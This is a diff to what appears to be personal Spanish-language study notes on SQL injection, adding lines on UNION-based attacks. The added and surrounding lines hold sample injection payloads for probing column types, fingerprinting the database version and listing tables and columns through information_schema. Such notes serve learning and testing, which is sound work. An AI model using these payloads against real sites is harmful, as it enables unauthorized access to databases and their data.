@@ -35,11 +35,14 @@ https://github.com/b0ydcBug/webside/blob/main/sql_injection/notas.txt
 _COMO SABER EL DATA TYPE DE UNA COLUMNA ?
 [es posible saber esto inspeccionando el site como tal]
 
+' UNION SELECT 'a','a'-- | se tiene que hacer iterativo cambiando los campos para saber que tipo son. ese ejemplo esta probando si son string.
+
 ORACLE: ' UNION SELECT 'a','a' from DUAL--
 https://docs.oracle.com/database/121/SQLRF/statements_10002.htm
 
 ###> IDENTIFICAR INFORMACION DEL MOTOR DE BASE DE DATOS
-(para recolectar informacion de la base de datos, debe estar presente el SQLi UNION Attack donde muestre en respuesta (pantalla) la data)
+(para recolectar informacion de la base de datos, debe estar presente el SQLi UNION Attack donde muestre en respuesta (pantalla) la data). tener 
+en cuenta las columnas !!
 
 ex: ' UNION SELECT @@version
 
@@ -52,4 +55,5 @@ PostgreSQL >> SELECT version()
 [ORACLE no tiene esta opcion]
 
 SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns
 
